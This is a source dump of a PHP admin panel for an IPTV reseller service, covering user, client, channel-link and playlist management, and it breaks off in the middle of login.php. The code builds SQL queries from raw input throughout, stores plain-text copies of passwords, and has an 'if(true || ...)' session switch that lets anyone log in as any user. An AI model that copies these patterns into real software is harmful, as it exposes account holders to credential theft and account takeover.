

/controles:
/controles/adicionar-administrador.php:
<?php
session_start();
require_once('conexao.php');

$id = rand(0, 99);
$nome = $_POST['nome'];
$senha = md5(sha1($_POST['senha'] . "iptv"));
$login = $_POST['login'];
$admin = "1";
$vendedor = "0";
$estado = "1";
$conectado = "0";
$credito = "0";
$acesso = "";
$master = "0";
$criador = $_SESSION['id_usuario'];
$data = "";
$dia = "0";
$uso = "0";
$uso_dia = "0";
$password = $_POST['senha'];

$result = "INSERT INTO usuario(id_usuario, nome_usuario, senha_usuario, login_usuario, admin, vendedor, estado_usuario, conectado, credito, master, acesso, id_criador, data, dia, uso, uso_dia) VALUES ('$id','$nome','$senha','$login','$admin','$vendedor','$estado','$conectado','$credito','$master','$acesso','$criador','$data','$dia','$uso','$uso_dia')";
$usuarios = mysqli_query($conexao, $result);

$result = "INSERT INTO passwords(senha, id_usuario) VALUES ('$password','$id')";
$passwords = mysqli_query($conexao, $result);
?>
/controles/adicionar-categoria.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    ||  !strpos($_SERVER['HTTP_REFERER'], 'categoria.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('categorias.php');
require_once('msg.php');

if (isset($_POST['nome'])) {
    $nome = $_POST['nome'];
    if ($nome !== "") {
        if (!adicionarCategoria($nome)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/adicionar-cliente.php:
<?php
session_start();
require_once('conexao.php');

$id = rand(0, 9999);
$nome = $_POST['nome'];
$senha = md5(sha1($_POST['senha'] . "iptv"));
$login = $_POST['login'];
$admin = "0";
$vendedor = "0";
$estado = "1";
$conectado = "1";
$credito = "0";
$master = "0";
$acesso = substr(md5(time()) ,0);
$criador = $_SESSION['id_usuario'];
$data = date('Y-m-d', strtotime('+31 days'));
$dia = "31";
$uso = "0";
$uso_dia = "0";
$lista = $_POST['lista'];
$password = $_POST['senha'];

$result = "INSERT INTO usuario(id_usuario, nome_usuario, senha_usuario, login_usuario, admin, vendedor, estado_usuario, conectado, credito, master, acesso, id_criador, data, dia, uso, uso_dia) VALUES ('$id','$nome','$senha','$login','$admin','$vendedor','$estado','$conectado','$credito','$master','$acesso','$criador','$data','$dia','$uso','$uso_dia')";
$usuarios = mysqli_query($conexao, $result);

$result = "INSERT INTO lista_usuario(id_lista, id_usuario) VALUES ('$lista','$id')";
$listas = mysqli_query($conexao, $result);

$result = "INSERT INTO passwords(senha, id_usuario) VALUES ('$password','$id')";
$passwords = mysqli_query($conexao, $result);
?>
/controles/adicionar-evento.php:
<?php
require_once('eventos.php');
require_once('msg.php');

if (isset($_POST['nome'])) {
    $nome = $_POST['nome'];
    if ($nome !== "") {
        if (!adicionarEvento($nome)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/adicionar-link.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    ||  !strpos($_SERVER['HTTP_REFERER'], 'link.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('links.php');
require_once('msg.php');

if (isset($_POST['nome']) && isset($_POST['link']) && isset($_POST['categoria']) && isset($_POST['logo'])) {
    $nome = $_POST['nome'];
    $link = $_POST['link'];
    $categoria = $_POST['categoria'];
    $logo = $_POST['logo'];
    if ($nome !== "" && $link !== "" && $categoria !== "" && $logo !== "") {
        if (!adicionarlink($nome, $link, $categoria, $logo)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}

/controles/adicionar-lista-global.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    ||  !strpos($_SERVER['HTTP_REFERER'], 'lista.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('listas.php');
require_once('msg.php');

if (isset($_POST['nome']) && isset($_POST['categoria'])) {
    $nome = $_POST['nome'];
    $categoria = $_POST['categoria'];
    if ($nome !== "" && $categoria !== "") {
        if (!adicionarListaGlobal($nome, $categoria)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/adicionar-mensagem.php:
<?php
require_once('mensagens.php');
require_once('msg.php');

if (isset($_POST['titulo'])) {
    if ($_POST['titulo'] !== "") {
        if (!adicionarMensagem($_POST['titulo'], $_POST['mensagem'], $_POST['id_evento'], $_POST['id_evento'])) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/adicionar-teste.php:
<?php
session_start();
require_once('conexao.php');

$id = rand(0, 9999);
$nome = $_POST['nome'];
$senha = md5(sha1($_POST['senha'] . "iptv"));
$login = $_POST['login'];
$admin = "0";
$vendedor = "0";
$estado = "1";
$conectado = "1";
$credito = "0";
$master = "0";
$acesso = substr(md5(time()) ,0);
$criador = $_SESSION['id_usuario'];
$data = date('Y-m-d', strtotime('+1 days'));
$dia = "1";
$uso = "0";
$uso_dia = "0";
$lista = $_POST['lista'];
$password = $_POST['senha'];

$result = "INSERT INTO usuario(id_usuario, nome_usuario, senha_usuario, login_usuario, admin, vendedor, estado_usuario, conectado, credito, master, acesso, id_criador, data, dia, uso, uso_dia) VALUES ('$id','$nome','$senha','$login','$admin','$vendedor','$estado','$conectado','$credito','$master','$acesso','$criador','$data','$dia','$uso','$uso_dia')";
$usuarios = mysqli_query($conexao, $result);

$result = "INSERT INTO lista_usuario(id_lista, id_usuario) VALUES ('$lista','$id')";
$listas = mysqli_query($conexao, $result);

$result = "INSERT INTO passwords(senha, id_usuario) VALUES ('$password','$id')";
$passwords = mysqli_query($conexao, $result);
?>
/controles/adicionar-url.php:
<?php
session_start();
require_once('conexao.php');

$url_original = $_POST['url_original'];
$url_encurtada = $_POST['url_encurtada'];
$id_criador = $_SESSION['id_usuario'];

$result = "INSERT INTO encurtador(id_usuario, url_original, url_encurtada) VALUES ('$id_criador','$url_original','$url_encurtada')";
$urls = mysqli_query($conexao, $result);
?>
/controles/adicionar-usuario.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    ||  !strpos($_SERVER['HTTP_REFERER'], 'usuario.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('usuarios.php');
require_once('msg.php');

if(isset($_POST['nome']) && isset($_POST['login']) && isset($_POST['admin'])) {
    $nome = $_POST['nome'];
    $login = $_POST['login'];
    $admin = $_POST['admin'];
    $vendedor = $_POST['vendedor'];
	$password = $_POST['senha'];

	$result = "INSERT INTO passwords(senha, id_usuario) VALUES ('$password','$login')";
	$passwords = mysqli_query($conexao, $result);

    if (isset($_POST['senha'])) {
        $senha = $_POST['senha'];
    } else {
        $senha = "";
    }
    
    if (isset($_POST['lista'])) {
        $lista = $_POST['lista'];
    } else {
        $lista = [];
    }

    if ($nome !== "" && $login !== "" && $admin !== "") {
        if (!adicionarUsuario($nome, $login, $senha, $admin, $vendedor, $_POST['credito'], $_POST['master'], $lista)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/categorias.php:
<?php
if (basename($_SERVER["PHP_SELF"]) === basename(__FILE__)) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}
require_once("conexao.php");

function nomeCategoria($id) {
    if ($id !== NULL) {
        global $conexao;
        $query = "select categoria.nome from categoria where categoria.id =$id";
        $resultado = mysqli_query($conexao, $query);
        return mysqli_fetch_assoc($resultado)['nome'];
    } else {
        return "";
    }
}

function listarCategorias() {
    $categorias = array();
    global $conexao;
    session_start();
    $query = "select * from categoria where id_usuario = ".$_SESSION['id_usuario']."";
    if($_SESSION['admin']){
        $query = "select * from categoria";
    }
    $resultado = mysqli_query($conexao, $query);
    while($categoria = mysqli_fetch_assoc($resultado)) {
        array_push($categorias, $categoria);
    }
    return $categorias;
}

function listarCategoriasNaoVazias() {
    $categorias = array();
    global $conexao;
    $query = "select distinct categoria.* from categoria inner join link on (link.id_categoria = categoria.id)";
    $resultado = mysqli_query($conexao,$query);
    while ($categoria = mysqli_fetch_assoc($resultado)) {
        array_push($categorias,$categoria);
    }
    return $categorias;
}

function adicionarCategoria($nome) {
    global $conexao;
    session_start();
    $query = "insert into categoria (nome, id_usuario) values ('{$nome}', ".$_SESSION['id_usuario'].")";
    return mysqli_query($conexao, $query);
}

function removerCategoria($id) {
    global $conexao;
    $query = "delete from categoria where id=$id";
    return mysqli_query($conexao, $query);
}

function editarCategoria($id, $nome) {
    global $conexao;
    $query = "update categoria set nome= '$nome' where id=$id";
    $r = mysqli_query($conexao, $query);
    return $r;
}

function obterCategoria($id, $nome = false) {
    $links = array();
    global $conexao;
    $query = "select link.nome_link, link.epg_link, link.link_link, link.logo, categoria.nome from link inner join categoria on (link.id_categoria = categoria.id ) where categoria.id = $id";
    if($nome){
        $query = "select * from categoria where nome = '".$nome."'";
    }
    $resultado = mysqli_query($conexao, $query);
    while($link = mysqli_fetch_assoc($resultado)) {
        array_push($links, $link);
    }
    return $links;
}
?>
/controles/conexão.php:
<?php
// DADOS DA HOSPEDAGEM
$endereco = "localhost"; // aqui você coloca host mysql
$usuario = "root"; // aqui você coloca nome de usuário mysql
$senha = ""; // aqui você coloca senha mysql
$banco = "painelpainel"; // aqui você coloca banco de dados mysql

// CONFIGURAÇÃO PAINEL
$nome = "TV Serve"; // aqui você coloca seu nome da empresa
$copy = "XtreamServe.ga"; // aqui você coloca seu copyright
$img = "img/logo.png"; // aqui você coloca seu logotipo na página de login
$img2 = "img/logo-min.png"; // aqui você coloca seu logotipo na página do painel

// HORA PAINEL
date_default_timezone_set('America/Sao_Paulo');

// DATA PAINEL
$t = date('d-m-Y');
$dayNum = strtolower(date("d",strtotime($t)));
$dayNum = intval($dayNum);

// CONEXÃO PAINEL
if (mysqli_connect($endereco, $usuario, $senha, $banco)) {
    $conexao = mysqli_connect($endereco, $usuario, $senha, $banco);
} else {
    header("Location: erro.php");
    die();
}

// ATUALIZAR DATA DE ACESSO
$q1 = 'UPDATE usuario SET uso = uso + 1, uso_dia = '.$dayNum.' WHERE uso_dia != '.$dayNum.'';
$q2 = 'UPDATE usuario SET estado_usuario = 0, uso = 0 WHERE dia = '.$dayNum.' and uso >= 1';
mysqli_query($conexao, $q1);	
mysqli_query($conexao, $q2);
?>
/controles/editar-administrador.php:
<?php
session_start();
include_once("conexao.php");

$id = $_POST['id'];
$nome_usuario = $_POST['nome'];
$senha_usuario = md5(sha1($_POST['senha'] . "iptv"));
$login_usuario = $_POST['login'];
$estado_usuario = $_POST['estado'];
$password = $_POST['senha'];

$result_usuario = "UPDATE usuario SET nome_usuario='$nome_usuario', senha_usuario='$senha_usuario', login_usuario='$login_usuario', estado_usuario='$estado_usuario' WHERE id_usuario='$id'";
$resultado_usuario = mysqli_query($conexao, $result_usuario);

$result = "UPDATE passwords SET senha='$password' WHERE id_usuario='$id'";
$passwords = mysqli_query($conexao, $result);

if(mysqli_affected_rows($conexao)){
	$_SESSION['msg'] = "";
	header("Location: ../administrador.php");
}else{
	$_SESSION['msg'] = "";
	header("Location: ../administrador.php");
}
?>
/controles/editar-categoria.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    || !strpos($_SERVER['HTTP_REFERER'], 'categoria.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('categorias.php');
require_once('msg.php');

if (isset($_POST['id']) && isset($_POST['nome'])) {
    $id = $_POST['id'];
    $nome = $_POST['nome'];
    if ($nome !== "" && $id !== "") {
        if (!editarCategoria($id, $nome)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/editar-cliente.php:
<?php
session_start();
include_once("conexao.php");

$id = $_POST['id'];
$nome_usuario = $_POST['nome'];
$senha_usuario = md5(sha1($_POST['senha'] . "iptv"));
$login_usuario = $_POST['login'];
$estado_usuario = $_POST['estado'];
$conectado = $_POST['conectado'];
$password = $_POST['senha'];

$result_usuario = "UPDATE usuario SET nome_usuario='$nome_usuario', senha_usuario='$senha_usuario', login_usuario='$login_usuario', estado_usuario='$estado_usuario', conectado='$conectado' WHERE id_usuario='$id'";
$resultado_usuario = mysqli_query($conexao, $result_usuario);

$result = "UPDATE passwords SET senha='$password' WHERE id_usuario='$id'";
$passwords = mysqli_query($conexao, $result);

if(mysqli_affected_rows($conexao)){
	$_SESSION['msg'] = "";
	header("Location: ../cliente.php");
}else{
	$_SESSION['msg'] = "";
	header("Location: ../cliente.php");
}
?>
/controles/editar-evento.php:
<?php
require_once('eventos.php');
require_once('msg.php');

if (isset($_POST['nome'])) {
    $nome = $_POST['nome'];
    if ($nome !== "") {
        if (!editarEvento($_POST['id'], $nome)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/editar-link.php:
<?php

if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    ||  !strpos($_SERVER['HTTP_REFERER'], 'link.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('links.php');
require_once('msg.php');

if (isset($_POST['id']) && isset($_POST['nome']) && isset($_POST['link']) && isset($_POST['categoria']) && isset($_POST['logo'])) {
    $id = $_POST['id'];
    $nome = $_POST['nome'];
    $link = $_POST['link'];
    $categoria = $_POST['categoria'];
    $logo = $_POST['logo'];
    if ($id !== "" && $nome !== "" && $link !== "" && $categoria !== "" && $logo !== "") {
        if (!editarlink($id, $nome, $link, $categoria, $logo)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/editar-lista-global.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    ||  !strpos($_SERVER['HTTP_REFERER'], 'lista.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

require_once('listas.php');
require_once('msg.php');

if (isset($_POST['id']) && isset($_POST['nome']) && isset($_POST['categoria'])) {
    $id = $_POST['id'];
    $nome = $_POST['nome'];
    $categoria = $_POST['categoria'];
    if ($id !== "" && $nome !== "" && $categoria !== "") {
        if (!editarListaGlobal($id, $nome, $categoria)) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/editar-mensagem.php:
<?php
require_once('mensagens.php');
require_once('msg.php');

if (isset($_POST['titulo'])) {
    if ($_POST['titulo'] !== "") {
        if (!editarMensagem($_POST['id'], $_POST['titulo'], $_POST['mensagem'], $_POST['id_evento'])) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/editar-usuario.php:
<?php
session_start();
include_once("conexao.php");

$id = $_POST['id'];
$nome_usuario = $_POST['nome'];
$senha_usuario = md5(sha1($_POST['senha'] . "iptv"));
$login_usuario = $_POST['login'];
$estado_usuario = $_POST['estado'];
$credito = $_POST['credito'];
$master = $_POST['master'];
$lista = $_POST['lista'];
$password = $_POST['senha'];

$result_usuario = "UPDATE usuario SET nome_usuario='$nome_usuario', senha_usuario='$senha_usuario', login_usuario='$login_usuario', estado_usuario='$estado_usuario', credito='$credito', master='$master' WHERE id_usuario='$id'";
$resultado_usuario = mysqli_query($conexao, $result_usuario);

$result2 = "UPDATE usuario SET estado_usuario='$estado_usuario' WHERE id_criador='$id'";
$usuarios = mysqli_query($conexao, $result2);

$result = "UPDATE passwords SET senha='$password' WHERE id_usuario='$login_usuario'";
$passwords = mysqli_query($conexao, $result);

if(mysqli_affected_rows($conexao)){
	$_SESSION['msg'] = "";
	header("Location: ../usuario.php");
}else{
	$_SESSION['msg'] = "";
	header("Location: ../usuario.php");
}
?>
/controles/eventos.php:
<?php
require_once("conexao.php");

function nomeEvento($id) {
    if ($id !== NULL) {
        global $conexao;
        $query = "select nome from eventos where id_evento =$id";
        $resultado = mysqli_query($conexao, $query);
        return mysqli_fetch_assoc($resultado)['nome'];
    } else {
        return "";
    }
}

function listarEventos() {
    $categorias = array();
    global $conexao;
    session_start();
    if($_SESSION['admin']){
        $query = "select * from eventos";
    }
    $resultado = mysqli_query($conexao, $query);
    while($categoria = mysqli_fetch_assoc($resultado)) {
        array_push($categorias, $categoria);
    }
    return $categorias;
}

function adicionarEvento($nome) {
    global $conexao;
    session_start();
    $query = "insert into eventos (nome) values ('{$nome}')";
    return mysqli_query($conexao, $query);
}

function removerEvento($id) {
    global $conexao;
    $query = "delete from eventos where id_evento=$id";
    return mysqli_query($conexao, $query);
}

function editarEvento($id, $nome) {
    global $conexao;
    $query = "update eventos set nome= '$nome' where id_evento=$id";
    return mysqli_query($conexao, $query);
}

function obterEvento($id) {
    $links = array();
    global $conexao;
    $query = "select * from eventos where id_evento = $id";
    $resultado = mysqli_query($conexao, $query);
    while($link = mysqli_fetch_assoc($resultado)) {
        array_push($links, $link);
    }
    return $links;
}
?>
/controles/paracar-login.php:
<?php
session_start();
require('usuarios.php');
$id_usuario = $_GET['id_usuario'];
if(true || $_SESSION['admin'] || $_SESSION['original'] != $_SESSION['id_usuario']){
   $usuario = porid($id_usuario);
   logarUsuario($usuario['nome_usuario']);
   //$_SESSION['original'] = $original;
   $_SESSION['id_usuario'] = $id_usuario;
   if($id_usuario != $_SESSION['original']) { 
	$_SESSION['admin'] = 0; 
	$_SESSION['vendedor'] = 1;
   } 
   else {
	$original = porid($_SESSION['original']);
	$_SESSION['vendedor'] = intval($original['vendedor']) == 1;
	$_SESSION['admin'] = intval($original['admin']) == 1;
   }
}
?>
/controles/importar-arquivo.php:
<?php
include('categorias.php');
include('links.php');

// Validação de upload
if (!isset($_FILES['files']) || $_FILES['files']['error'][0] !== UPLOAD_ERR_OK) {
    die("Erro ao enviar arquivos.");
}

foreach ($_FILES['files']['tmp_name'] as $key => $tmp_name) {
    $file_tmp = $_FILES['files']['tmp_name'][$key];
    $data = file_get_contents($file_tmp);

    // Verificar formato do arquivo
    if (strpos($data, '#EXTM3U') === false) {
        die("O arquivo não está no formato .m3u válido.");
    }

    // Processar o arquivo
    $data = str_replace("'", '"', $data);
    $data = explode('#EXTINF:', $data);
    $groups = [];
    $channels = [];

    foreach ($data as $item) {
        $groupName = extractGroupName($item);
        if ($groupName && !array_key_exists($groupName, $groups)) {
            $groups[$groupName] = processCategory($groupName);
        }

        $channelName = extractChannelName($item);
        if ($channelName && !array_key_exists($channelName, $channels)) {
            $channels[$channelName] = true;
            processChannel($channelName, $item, $groups[$groupName]);
        }
    }
}

function extractGroupName($item) {
    preg_match('/title="([^"]+)"/', $item, $matches);
    return trim($matches[1] ?? "");
}

function extractChannelName($item) {
    preg_match('/,(.*?)\n/', $item, $matches);
    return trim($matches[1] ?? "");
}

function processCategory($groupName) {
    $category = obterCategoria(0, $groupName);
    if (empty($category)) {
        adicionarCategoria($groupName);
        $category = obterCategoria(0, $groupName);
    }
    return $category;
}

function processChannel($channelName, $item, $category) {
    $link = extractLink($item);
    $image_url = extractImageUrl($item);
    adicionarlink($channelName, $link, $category[0]['id'], $image_url);
}

function extractLink($item) {
    preg_match('/http[^\s]+/', $item, $matches);
    return trim($matches[0] ?? "");
}

function extractImageUrl($item) {
    preg_match('/logo="([^"]+)"/', $item, $matches);
    return trim($matches[1] ?? "");
}
?>
/controles/importar-url.php:
<?php
require_once("categorias.php");
require_once("links.php");

// Função para obter conteúdo da URL
function get_url($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_REFERER, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    $page = curl_exec($ch);
    curl_close($ch);
    return $page;
}

// Validação da URL
$url = $_POST['url'] ?? '';
if (!filter_var($url, FILTER_VALIDATE_URL)) {
    die("URL inválida.");
}

// Obter e processar o conteúdo
$data = get_url($url);
if (strpos($data, '#EXTM3U') === false || strpos($data, '#EXTINF') === false) {
    die("O conteúdo não está no formato .m3u válido.");
}

// Processar o conteúdo
$data = str_replace("'", '"', $data);
$data = explode('#EXTINF:', $data);
$groups = [];
$channels = [];

foreach ($data as $item) {
    $groupName = extractGroupName($item);
    if ($groupName && !array_key_exists($groupName, $groups)) {
        $groups[$groupName] = processCategory($groupName);
    }

    $channelName = extractChannelName($item);
    if ($channelName && !array_key_exists($channelName, $channels)) {
        $channels[$channelName] = true;
        processChannel($channelName, $item, $groups[$groupName]);
    }
}

// Funções auxiliares
function extractGroupName($item) {
    preg_match('/title="([^"]+)"/', $item, $matches);
    return trim($matches[1] ?? "");
}

function extractChannelName($item) {
    preg_match('/,(.*?)\n/', $item, $matches);
    return trim($matches[1] ?? "");
}

function processCategory($groupName) {
    $category = obterCategoria(0, $groupName);
    if (empty($category)) {
        adicionarCategoria($groupName);
        $category = obterCategoria(0, $groupName);
    }
    return $category;
}

function processChannel($channelName, $item, $category) {
    $link = extractLink($item);
    $image_url = extractImageUrl($item);
    adicionarlink($channelName, $link, $category[0]['id'], $image_url);
}

function extractLink($item) {
    preg_match('/http[^\s]+/', $item, $matches);
    return trim($matches[0] ?? "");
}

function extractImageUrl($item) {
    preg_match('/logo="([^"]+)"/', $item, $matches);
    return trim($matches[1] ?? "");
}
?>
/controles/ler-mensagem.php:
<?php
require_once('mensagens.php');
require_once('msg.php');

if (isset($_GET['id_mensagem'])) {
    $id = $_GET['id_mensagem'];
    if ($id !== "") {
        if (!marcarComoLida($id, $_GET['remover'])) {
            erro();
        }
    } else {
        embranco();
    }
} else {
    invalido();
}
?>
/controles/links.php:
<?php
if (basename($_SERVER["PHP_SELF"]) === basename(__FILE__)) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}
require_once("conexao.php");

function listarLinks() {
    $links = array();
    global $conexao;
    session_start();
    $query = "select * from link where id_usuario = ".$_SESSION['id_usuario']."";
    if($_SESSION['admin']){
        $query = "select * from link";
    }
    $resultado = mysqli_query($conexao, $query);
    while($link = mysqli_fetch_assoc($resultado)) {
        array_push($links, $link);
    }
    return $links;
}
function adicionarlink($nome, $link, $categoria, $logo) {
    global $conexao;
    session_start();
    $acesso = md5($nome);
    $query = "insert into link (id_usuario, nome_link, link_link, id_categoria, logo, acessoLink) values (".$_SESSION['id_usuario'].", '$nome', '$link', $categoria, '$logo', '$acesso')";
    return  mysqli_query($conexao, $query);
}
function criarLog($id, $nome, $logo, $ip, $data){
    global $conexao;
    session_start();
    $acesso = md5($nome);
    $query = "insert into logs (id_usuario, nome, logo, ip, data) values ($id, '$nome', '$logo', '$ip', '$data') LIMIT 1";
    return mysqli_query($conexao, $query);    
}
function buscarLink($usuario, $acesso) {
    global $conexao;
    $query = "select link.* from link inner join categoria on (link.id_categoria = categoria.id) 
    inner join lista_global_categoria on (lista_global_categoria.id_categoria = categoria.id) 
    inner join lista_usuario on (lista_usuario.id_lista = lista_global_categoria.id_lista ) 
    inner join usuario on (lista_usuario.id_usuario = usuario.id_usuario) 
    where usuario.acesso = '$usuario' and link.acessoLink = '$acesso' and usuario.estado_usuario = 1";
    $resultado = mysqli_query($conexao, $query);
    return mysqli_fetch_assoc($resultado);
}
function buscarUsuario($acesso){
    global $conexao;
    $query = "select * from usuario where acesso = '".$acesso."'";
    $usuario = [];
    $resultado = mysqli_query($conexao, $query);
    while($link = mysqli_fetch_assoc($resultado)) {
        $usuario[] = $link;
    }
    return $usuario[0];
}
function removerlink($id) {
    global $conexao;
    $query = "delete from link where id_link=$id";
    return mysqli_query($conexao, $query);
}

function editarlink($id, $nome, $link, $categoria, $logo) {
    global $conexao;
    $query = "update link set nome_link= '$nome', link_link = '$link', id_categoria = $categoria, logo= '$logo' where id_link=$id";
    return mysqli_query($conexao, $query);
}

function obterLink($id, $nome = false) {
    global $conexao;
    $query = "select link.nome_link, link.link_link, link.logo, categoria.nome from link inner join categoria on (link.id_categoria = categoria.id) where link.id_link = $id";
    if($nome){
        $query = "select * from link where nome_link = '".$nome."'";
    }
    $resultado = mysqli_query($conexao, $query);
    return mysqli_fetch_assoc($resultado);
}
?>
/controles/listas.php:
<?php
if (basename($_SERVER["PHP_SELF"]) === basename(__FILE__)) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}
require_once("conexao.php");

function listarListas() {
    $listas = array();
    global $conexao;
    if($_SESSION['admin']){
        $query = "select * from lista";
    } else {
        $query = "select * from lista l where l.id_lista in (select lu.id_lista from lista_usuario lu where lu.id_usuario = ".$_SESSION['id_usuario'].")";
    }
    
    $resultado = mysqli_query($conexao, $query);
    while($lista = mysqli_fetch_assoc($resultado)) {
        array_push($listas, $lista);
    }
    return $listas;
}

function adicionarLista($nome, $lista) {
    global $conexao;
    $query = "insert into lista (nome_lista, lista, id_usuario) values ('$nome', '$lista', ".$_SESSION['id_usuario'].")";
    return mysqli_query($conexao, $query);
}

function adicionarListaGlobal($nome, $categoria) {
    global $conexao;
    $query = "insert into lista (nome_lista, global) values ('$nome', 1)";
    $resultado = mysqli_query($conexao, $query);
    $id = mysqli_insert_id($conexao);
    if (count($categoria) > 0) {
        mysqli_query($conexao, "delete from lista_global_categoria where id_lista= $id");
        for ($i =0; $i < count($categoria); $i++) {
            mysqli_query($conexao, "insert into lista_global_categoria (id_categoria, id_lista) values ($categoria[$i], $id)");
        }
    }
    return $resultado;
}

function editarListaGlobal($id, $nome, $categoria) {
    global $conexao;
    $query = "update lista set nome_lista= '$nome' where id_lista=$id";
    
    if (count($categoria) > 0) {
        mysqli_query($conexao, "delete from lista_global_categoria where id_lista= $id");
        for ($i =0; $i < count($categoria); $i++) {
            if (mysqli_num_rows(mysqli_query($conexao, "select * from lista_global_categoria where id_lista= $id and id_categoria = $categoria[$i]")) == 0) {
                mysqli_query($conexao, "insert into lista_global_categoria (id_categoria, id_lista) values ($categoria[$i], $id)");
            }
        }
    } else {
        mysqli_query($conexao, "delete from lista_global_categoria where id_lista= $id");
    }

    return mysqli_query($conexao, $query);
}

function categoriasLista($id) {
    $categorias = array();
    global $conexao;
    $query = "select categoria.* FROM lista_global_categoria INNER JOIN lista ON (lista.id_lista = lista_global_categoria.id_lista) INNER JOIN categoria ON (categoria.id = lista_global_categoria.id_categoria) where lista.id_lista = $id";
    $resultado = mysqli_query($conexao, $query);
    while($categoria = mysqli_fetch_assoc($resultado)) {
        array_push($categorias, $categoria);
    }
    return $categorias;
}

function removerLista($id) {
    global $conexao;
    $query = "delete from lista where id_lista=$id";
    return mysqli_query($conexao, $query);
}

function obterLista($id) {
    global $conexao;
    $query = "select lista.lista from lista where id_lista = $id";
    $resultado = mysqli_query($conexao, $query);
    return mysqli_fetch_assoc($resultado)['lista'];
}

function editarLista($id, $nome, $lista) {
    global $conexao;
    $query = "update lista set nome_lista= '$nome', lista = '$lista' where id_lista=$id";
    return mysqli_query($conexao, $query);
}

function obterListaUsuarios($id) {
    $usuarios = array();
    session_start();
    global $conexao;
    $query = "select u.id_usuario, u.nome_usuario from usuario u inner join lista_usuario lu on lu.id_usuario = u.id_usuario and lu.id_lista = ".$id." and lu.id_usuario != ".$_SESSION['id_usuario']." where u.id_criador = ".$_SESSION['id_usuario']." group by u.id_usuario";
    if($_SESSION['admin']){
        $query = "select u.id_usuario, u.nome_usuario from usuario u inner join lista_usuario lu on lu.id_usuario = u.id_usuario and lu.id_lista = ".$id." and lu.id_usuario != ".$_SESSION['id_usuario']." group by u.id_usuario";
    }
    $resultado = mysqli_query($conexao, $query);
    while ($usuario = mysqli_fetch_assoc($resultado)) {
        array_push($usuarios,$usuario);
    }
    return $usuarios;
}

function obterLinkLista($idLista,$idUsuario) {
    global $conexao;
    $query = "select acesso from usuario where id_usuario= $idUsuario";
    $resultadoUsuario = mysqli_query($conexao, $query);
    $usuario = mysqli_fetch_assoc($resultadoUsuario);
    return preg_replace('/controles\/obter-link-lista.php/', '', (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]exibir.php?usuario={$usuario['acesso']}&lista={$idLista}&tipo=m3u_plus");
    
}

function listaGlobal($idlista) {
    $links = array();
    global $conexao;
    $resultado = mysqli_query($conexao, "select distinct link.nome_link, link.link_link, link.logo, link.acessoLink, 
    categoria.nome from link inner join lista_global_categoria on 
    (link.id_categoria = lista_global_categoria.id_categoria) inner join categoria on 
    (link.id_categoria = categoria.id) where lista_global_categoria.id_lista = $idlista order by categoria.nome asc");
    while($link = mysqli_fetch_assoc($resultado)) {
        array_push($links,$link);
    }
    return $links;
}
?>
/controles/login.php:
<?php
if (!isset($_SERVER['HTTP_REFERER']) &&  !strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST'] ) 
    &&  !strpos($_SERVER['HTTP_REFERER'], 'index.php' )) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: ../index.php");
    die();
}

session_start();
require_once("usuarios.php");

$usuario = $_POST["usuario"];
$senha = $_POST["senha"];
$senha = md5(sha1($senha . "iptv"));

